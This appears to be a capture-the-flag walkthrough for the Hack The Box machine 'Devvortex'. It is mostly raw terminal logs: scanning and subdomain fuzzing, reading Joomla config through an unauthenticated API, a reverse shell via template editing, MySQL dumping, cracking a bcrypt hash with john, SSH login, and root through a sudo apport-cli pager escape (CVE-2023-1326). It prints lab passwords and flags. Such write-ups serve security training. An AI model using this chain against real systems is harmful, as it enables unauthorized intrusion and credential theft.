┌──(root㉿kali)-\[/home/kali/HTB/Devvortex\]

└─# nmap -p- --min-rate 10000 10.10.11.242

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 15:39 JST

Warning: 10.10.11.242 giving up on port because retransmission cap hit (10).

Nmap scan report for devvortex.htb (10.10.11.242)

Host is up (0.27s latency).

Not shown: 65418 closed tcp ports (reset), 115 filtered tcp ports (no-response)

PORT   STATE SERVICE

22/tcp open  ssh

80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds

![[Devvortex image.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Devvortex\]

└─# nmap -p80 -sV -sC -A 10.10.11.242

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-15 15:41 JST

Nmap scan report for devvortex.htb (10.10.11.242)

Host is up (0.22s latency).

PORT   STATE SERVICE VERSION

80/tcp open  http    nginx 1.18.0 (Ubuntu)

\|_http-title: DevVortex

\|_http-server-header: nginx/1.18.0 (Ubuntu)

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

Aggressive OS guesses: Linux 2.6.32 (96%), Linux 4.15 - 5.8 (96%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 5.0 - 5.5 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)

No exact OS matches for host (test conditions non-ideal).

Network Distance: 2 hops

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)

HOP RTT       ADDRESS

1   224.88 ms 10.10.14.1

2   221.82 ms devvortex.htb (10.10.11.242)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 23.29 seconds

![[Devvortex image 1.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Devvortex\]

└─# wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -t 50 --hc 302

/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************

\* Wfuzz 3.1.0 - The Web Fuzzer                         *

********************************************************

Target: http://devvortex.htb/

Total requests: 19966

\=====================================================================

ID           Response   Lines    Word       Chars       Payload

\=====================================================================

000000019:   200        501 L    1581 W     23221 Ch    "dev"

^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 32.53428

Processed Requests: 6323

Filtered Requests: 6322

Requests/sec.: 194.3488

![[Devvortex image 2.png]]

I found subdomain that "dev".

Browser Access

![[Devvortex image 3.png]]

http://dev.devvortex.htb/

![[Devvortex image 4.png]]

![[Devvortex image 5.png]]

http://dev.devvortex.htb/administrator/

![[Devvortex image 6.png]]

http://dev.devvortex.htb/api/index.php/v1/users?public=true

![[Devvortex image 7.png]]

http://dev.devvortex.htb/api/index.php/v1/config/application?public=true

![[Devvortex image 8.png]]

![[Devvortex image 9.png]]

http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=222&file=L2xvZ2luLnBocA%3D%3D&isMedia=0

![[Devvortex image 10.png]]

![[Devvortex image 11.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Devvortex\]

└─# nc -nlvp 1234

listening on \[any\] 1234 ...

connect to \[10.10.14.120\] from (UNKNOWN) \[10.10.11.242\] 52450

Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux

16:54:27 up  1:01,  0 users,  load average: 6.30, 4.69, 3.24

USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

uid=33(www-data) gid=33(www-data) groups=33(www-data)

/bin/sh: 0: can't access tty; job control turned off

$

![[Devvortex image 12.png]]

$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@devvortex:/$

![[Devvortex image 13.png]]

www-data@devvortex:~$ mysql -h localhost -u lewis -p

mysql -h localhost -u lewis -p

Enter password: P4ntherg0t1n5r3c0n##

Welcome to the MySQL monitor.  Commands end with ; or \g.

Your MySQL connection id is 84402

Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its

affiliates. Other names may be trademarks of their respective

owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>

![[Devvortex image 14.png]]

mysql> show databases;

show databases;

+--------------------+

\| Database           |

+--------------------+

\| information_schema |

\| joomla             |

\| performance_schema |

+--------------------+

3 rows in set (0.00 sec)

mysql> use joomla

use joomla

Reading table information for completion of table and column names

You can turn off this feature to get a quicker startup with -A

Database changed

![[Devvortex image 15.png]]

mysql> show tables;

show tables;

+-------------------------------+

\| Tables_in_joomla              |

+-------------------------------+

\| sd4fg_users                   |

![[Devvortex image 16.png]]

![[Devvortex image 17.png]]

mysql> select * from sd4fg_users;

select * from sd4fg_users;

+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+

\| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |

+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+

\| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-04-15 16:47:52 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |

\| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |

+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+

2 rows in set (0.01 sec)

![[Devvortex image 18.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Devvortex\]

└─# john -wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Created directory: /root/.john

Using default input encoding: UTF-8

Loaded 1 password hash (bcrypt \[Blowfish 32/64 X3\])

Cost 1 (iteration count) is 1024 for all loaded hashes

Will run 6 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

tequieromucho    (?)

1g 0:00:00:07 DONE (2024-04-16 02:11) 0.1355g/s 190.2p/s 190.2c/s 190.2C/s dianita..harry

Use the "--show" option to display all of the cracked passwords reliably

Session completed.

![[Devvortex image 19.png]]

┌──(root㉿kali)-\[/home/kali/HTB/Devvortex\]

└─# ssh logan@10.10.11.242

The authenticity of host '10.10.11.242 (10.10.11.242)' can't be established.

ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/\[fingerprint\])? yes

Warning: Permanently added '10.10.11.242' (ED25519) to the list of known hosts.

logan@10.10.11.242's password:

Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

\* Documentation:  https://help.ubuntu.com

\* Management:     https://landscape.canonical.com

\* Support:        https://ubuntu.com/advantage

System information disabled due to load higher than 2.0

\* Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s

just raised the bar for easy, resilient and secure K8s cluster deployment.

https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.

See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

Last login: Mon Feb 26 14:44:38 2024 from 10.10.14.23

logan@devvortex:~$

![[Devvortex image 20.png]]

logan@devvortex:~$ id

uid=1000(logan) gid=1000(logan) groups=1000(logan)

logan@devvortex:~$ ls

user.txt

logan@devvortex:~$ cat user.txt

3fb48581a161a99893317ad16c7783b8

![[Devvortex image 21.png]]

logan@devvortex:~$ sudo -l

\[sudo\] password for logan:

Matching Defaults entries for logan on devvortex:

env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:

(ALL : ALL) /usr/bin/apport-cli

![[Devvortex image 22.png]]

I found apport-cli of vulnerability for CVE-2023-1326

https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/

logan@devvortex:~$ sudo /usr/bin/apport-cli -v

2.20.11

![[Devvortex image 23.png]]

logan@devvortex:~$ sudo /usr/bin/apport-cli --file-bug

*** What kind of problem do you want to report?

Choices:

1: Display (X.org)

2: External or internal storage devices (e. g. USB sticks)

3: Security related problems

4: Sound/audio related problems

5: dist-upgrade

6: installation

7: installer

8: release-upgrade

9: ubuntu-release-upgrader

10: Other problem

C: Cancel

Please choose (1/2/3/4/5/6/7/8/9/10/C): 1

*** Collecting problem information

The collected information can be sent to the developers to improve the

application. This might take a few minutes.

*** What display problem do you observe?

Choices:

1: I don't know

2: Freezes or hangs during boot or usage

3: Crashes or restarts back to login screen

4: Resolution is incorrect

5: Shows screen corruption

6: Performance is worse than expected

7: Fonts are the wrong size

8: Other display-related problem

C: Cancel

Please choose (1/2/3/4/5/6/7/8/C): 2

***

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue...

...dpkg-query: no packages found matching xorg

............

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the

automatically opened web browser.

What would you like to do? Your options are:

S: Send report (1.5 KB)

V: View report

K: Keep report file for sending later or copying to somewhere else

I: Cancel and ignore future crashes of this program version

C: Cancel

Please choose (S/V/K/I/C): V

!/bin/bash

![[Devvortex image 24.png]]

![[Devvortex image 25.png]]

root@devvortex:/home/logan# cat /root/root.txt

b907eb1a7491091c6c0ca6f2840beca6

![[Devvortex image 26.png]]